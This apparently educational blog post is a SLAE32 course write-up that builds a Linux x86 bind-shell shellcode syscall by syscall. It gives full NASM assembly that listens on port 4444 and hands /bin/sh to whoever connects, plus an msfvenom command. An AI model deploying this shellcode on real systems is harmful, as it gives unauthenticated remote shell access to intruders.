---
layout: post
title:  "SLAE32"
subtitle: "|  Assignment 1 - Bind Shell"
date:   2022-09-14 08:45:58 +0200
category: SLAE32
subject: Assignment 1 - Bind Shell
excerpt_separator: <!--more-->
github-link: https://github.com/jeremycatelain/SLAE32-Assignments/tree/main/assignment1-Bind-code
---


###  <span style="color:#2d8fb3;"> Description of the assignment </span>

- Create a Shell_Bind_TCP Shellcode:
  - Binds to a port;
  - Execs Shell on incoming connection;
- Port should be easily configurable.
 
<!--more-->

###  <span style="color:#2d8fb3;"> MSFVenom example & Socket_call </span>

To perform this exercise, we started by analysing the bind shell code of Metasploit to see how it works and what syscall are made. To do so, we followed the steps as follows to create an image of the different syscalls performed and to make it more visible.

As follows the command lines to generate the graphical diagram of the metasploit bind shell :

    msfvenom -p linux/x86/shell_bind_tcp R | /opt/hackingtools/libemu/tools/sctest/sctest -vvv -Ss 100000 -G shell_bind_tcp.dot
    //Then convert into PNG file :
    dot shell_bind_tcp.dot -Tpng -o shell_bin_tcp.png 


**Result:**

<img src="/assets/slae32-img/assignment1/shell_bin_tcp.png" alt="drawing" style="max-width:100%;"/>

As we can see, there are 6 syscalls performed : 
- socket, 
- bind, 
- listen, 
- accept, 
- dup2, 
- execve.

Each of them will be detailled in the following section.

### <span style="color:#2d8fb3;"> Socketcall </span>

The first thing that we identified in the first syscall is the EAX value set to 0x66 (102 in decimal) related as we can see below to the "socketcall" syscall.

    root@kali:~# cat /usr/include/x86_64-linux-gnu/asm/unistd_32.h | grep 102
    #define __NR_socketcall 102
    #define __NR_socket 359
    #define __NR_socketpair 360


Then we look into more details about that syscall:

    man 2 socketcall
    int socketcall(int call, unsigned long *args);

The socketcall is composed of two parameters:

1) int call - Type of the syscall (socket, bind, ...)

2) unsigned long* args - Arguments of the desired syscall

### <span style="color:#2d8fb3;"> Socket </span>

The socket syscall creates a socket which will listen to the incoming connections. 

    man 2 socket 
    int socket(int domain, int type, int protocol)

The syscall is composed of the following parameters:

1) int domain - The protocol family used (AF_INET, AF_LOCAL, ...)

2) int type - The type of the service (TCP, UDP, ...)

3) int protocol - Specify if a particular protocol will be used with the socket (0 most of the time)

Note: More details can be find on the possible parameter values in the following paths:
- /usr/include/x86_64-linux-gnu/bits/socket.h (DOMAIN AND PROTOCOLS parameters)
- /usr/include/x86_64-linux-gnu/bits/socket_type.h (TYPE parameter)

So, we want to set the following parameters:
- EAX = 0x66 (socketcall syscall)
- EBX = 0x1 (SOCKET syscall)
- ECX (Address pointing to the arguments into the stack):
  - ECX[0] = 0x2 (PF_INET/AF_INET, IP protocol family)
  - ECX[1] = 0x1 (SOCK_STREAM, TCP connection based)
  - ECX[2] = 0x0 (Unspecified)

After that the syscall is performed with success, the file descriptor returned will be stored in the EAX register.

Useful link : The details of the *socket* can be find in the following links :
- <a href="http://shtroumbiniouf.free.fr/CoursInfo/Reseau2/Cours/SocketsBSD/SocketsBSD.html" style="color:#2d8fb3;">shtroumbiniouf.free.fr (French link)</a>
- <a href="http://sdz.tdct.org/sdz/les-sockets.html" style="color:#2d8fb3;">sdz.tdct.org (French link)</a>

  
**Assembly Code:**

	; EBX
	xor ebx, ebx
	push ebx ; push the x00000000 on the stack
	inc ebx ; SYS_SOCKET call 1 for socket
	push ebx ; push the 0x00000001 on the stack for the domain AF_INET of the SYS_SOCKET call 
	; ECX
	push byte 0x2 ; push the 0x00000002 on the stack for the type SOCK_STREAM
	mov ecx, esp ; put the arguments of the socketcall into ECX
	; EAX
	xor eax, eax
	mov al, 0x66
	; socket call
	int 0x80

###  <span style="color:#2d8fb3;"> Bind </span>

After the creation of the socket we need to bind it to an address.

    man 2 bind 
    int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);

With:

1) sockfd : File descriptor, return value of the socket syscall

2) sockaddr *addr : address argument which depends on the family

    struct sockaddr {
        sa_family_t sa_family;
        char        sa_data[14];
    }

In our case, with the Internet Family AF_INET, the address structure will be constructed as follows : 

    struct sockaddr_in {
        sa_family_t    sin_family; /* address family: AF_INET */
        in_port_t      sin_port;   /* port in network byte order */
        struct in_addr sin_addr;   /* internet address */
    };

    /* Internet address. */
    struct in_addr {
        uint32_t       s_addr;     /* address in network byte order */
    };
    
    
Note: From "/usr/src/linux-headers-5.2.0-kali2-common/include/uapi/linux/in.h"
    
- addrlen : The size, in bytes, of the address structure pointed to by addr

Useful Link:
  - <a href="https://man7.org/linux/man-pages/man7/ip.7.html" style="color:#2d8fb3;">man7.org (IP manual)</a>
  - <a href="https://www.scip.ch/en/?labs.20200521" style="color:#2d8fb3;">www.scip.ch (Example)</a>

This means that we need to pass the following registers:
- EAX = 0x66 (SOCKET_CALL)
- EBX = 0x2 (SYS_BIND)
- ECX (Address pointing to the arguments into the stack):
  - ECX[0] = File descriptor (Return value of the socket syscall)
  - ECX[1] (Address pointing to arguments into the stack):
    - ECX[1.0] = 0x2 (AF_INET)
    - ECX[1.1] = 0x115c (port 4444 in hexa)
    - ECX[1.2] = 0x00000000 (IP : 0.0.0.0)
  - ECX[2] = 0x10 (16 bytes)

The return value stored in EAX should be 0x00 in case of success!

Note that if we want to set up another IP such as 127.0.0.1, you need to convert each value in hexadecimal and push them in reverse into the stack.
   
    python hex(value)
    Result : 
        127 : 0x7f
        0   : 0x00
        0   : 0x00
        1   : 0x1
    Then push then into the stack in reverse order (0x0100007f).


**Assembly Code:**
        
	; EBX - SYS_SOCKET call 2 for bind
	pop ebx 
	; ECX
	; Creation of the struct sockaddr_in
	xor edi, edi
	push edi ; Push on the stack the IP address 0.0.0.0
	push word 0x5c11 ; Push on the stack the port 4444 TO MODIFY IF NEEDED
	push bx ; Push the Family AF_INET = 2
	mov ecx, esp ; mov the structure into ecx
	; Put all parameters into ECX
	push byte 0x10 ; Push on the stack the address length of 16
	push ecx ; 
	push eax ; push the file descriptor
	mov ecx, esp ; Move the stack into ECX
	; EAX
	xor eax, eax
	mov al, 0x66
	; bind call
	int 0x80

### <span style="color:#2d8fb3;"> Listen </span>

After that the socket has been binded, we need to listen to this socket. Listen() marks the socket referred by the sockfr as a passive socket, a socket that will be used to accept incoming connection requests using accept().

    man 2 listen
    int listen(int sockfd, int backlog)

The syscall is composed of the following arguments:

1) int sockfd : File descriptor

2) int backlog : Argument defining the maximum length to which the queue of pending connections for sockfr may grow

Then we will pass the following arguments :
- EAX = 0x66 (SOCKET_CALL)
- EBX = 0x4 (SYS_LISTEN)
- ECX (Address pointing to the arguments into the stack):
  - ECX[0] = sockfd (file descriptor which is the return value of the socket)
  - ECX[1] = 0x0 (no need of backlog)

The return value stored in EAX must be 0x00 in case of success.

**Assembly Code:**

	pop esi ; Retrieve the file descriptor
	; EAX & ECX backlog
	push edi ; Push on the stack 0 for the backlog 
	xor eax, eax
	mov al, 0x66 ; Set up EAX
	; EBX, 4 for listen 
	mov bl, 0x4
	; ECX 
	push esi
	mov ecx, esp
	; SYS CALL LISTEN
	int 0x80

### <span style="color:#2d8fb3;"> Accept </span>

Then, when there is an incoming connection to the socket, we need to accept that connection with the accept() function. 

    man 2 accept
    int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)

The syscall is composed of the following arguments:

1) int sockfd : File descriptor

2) struct sockaddr *addr : Pointer to the remote address

3) socklen_t *addrlen : Pointer to the address length

Then, we will pass the following arguments :
- EAX = 0x66 (SOCKET_CALL)
- EBX : 0x5 (SYS_ACCEPT)
- ECX :
  - ECX[0] = sockfd (file descriptor which is the return value of the socket call)
  - ECX[1] = 0x00000000 (Address of the peer socket)
  - ECX[2] = 0x00000000 (NULL because the address is NULL)

On success, the system call will return in the EAX register a file descriptor for the accepted socket.

**Assembly Code:**

	; EAX
	mov al, 0x66
	; EBX 
	inc ebx 	; 5 for the ACCEPT SYS CALL
	; ECX
	push edi	; NULL - address of the peer 
	push edi	; NULL 	
	push esi	; file descriptor
	mov ecx, esp
	int 0x80

###  <span style="color:#2d8fb3;"> Dup2 </span>

The next step is to redirect the STDIN, STDOUT and STDER to the socket session. The dup2() system call allocate a new file descriptor that refers to the same open file description as the descriptor oldfd. The file descriptor newfd is ajusted so that it refers to the same open file desdcription as oldfd. 

    root@kali:~# cat /usr/include/x86_64-linux-gnu/asm/unistd_32.h | grep dup2
        #define __NR_dup2 63

-

    man 2 dup2
    int dup2(int oldfd, int newfd)

The function is composed of:

1) int oldfd : File descriptor returned by the accept syscall

2) int newfd : File descriptor that we want to refer to

We will pass the following arguments :
- EAX : 0x3f (dup syscall, 63 in decimal)
- EBX : Previous EAX (File descriptor returned by the accept call)
- ECX : 0x2 to 0x0 (loop IN, OUT, ERR)

To perform the loop, we will use the intruction "JNS rel8" because it perform the jmp until the Sign Flag is set (SF=1), which mean that the zero is taken into account in the loop :

**Assembly Code:**
    
        ; EBX, File descriptor return by ACCEPT call
	    mov ebx, eax	; Retrieve the file descriptor
	
	    ; EAX, dup2 sys call 0x3f
	    xor eax, eax
	
	    ; initialize ECX 
	    xor ecx, ecx
	    mov cl, 0x2
	
	    ; LOOP

    DupLoop :
	 
	    mov al, 0x3f
	    int 0x80
	    dec ecx
	    jns DupLoop	


### <span style="color:#2d8fb3;"> Execve </span>

Now that we created a socket which is listening and accepting the connections, we will create the part of the code which will launch the execve syscall when someone is connecting to it.

    man 2 Execve
    int execve(const char *pathname, char *const argv[], char *const envp[])

The arguments are:

1) const char *pathname: Pointer to the filename

2) char *const argv[]: Pointer to the argument of the function

3) char *const envp[]: Array of pointers to strings passed as environment of the new program

We will pass the following arguments :
- EAX : 0xb (execve sys call, 11 in decimal)
- EBX : Pointer to /bin//sh + 0X00000000        
- ECX : Pointer to the address of EBX
- EDX : NULL

To pass the argument /bin/sh, we first converted it in hexadecimal and then reverse it.

**Assembly Code:**

    ; Push the 0x00000000 on the stack
	xor eax, eax
	push eax
	; put the string on the stack
	push 0x68732f2f
	push 0x6e69622f
	; setup EBX with the vlue of ESP
	mov ebx, esp
	; set up EDX and push null bytes again
	push eax
	mov edx, esp
	; set up ECX argv address on the first dw and null in second dw
	push ebx 
	; Then move the top of the stack into ECX
	mov ecx, esp
	; EAX
	mov al, 0xb
	int 0x80

###  <span style="color:#2d8fb3;"> Compilation </span>

Then we compiled the code with the following python script :

    root@kali:~/Documents/PentesterAcademy/SLAE32-Exam/bindshell# cat ../compile.sh 
    #! /bin/bash

    echo '[+] Assembling with NASM'
    nasm -f elf -o $1.o $1.nasm

    echo '[+] Linking ..'
    ld -m elf_i386 $1.o -o $1

    echo '[+] Done!'

And finally, we launch the bind shellcode and connect to it with the netcat tool.

<img src="/assets/slae32-img/assignment1/assess1-result.PNG" alt="drawing" style="max-width:100%;"/>



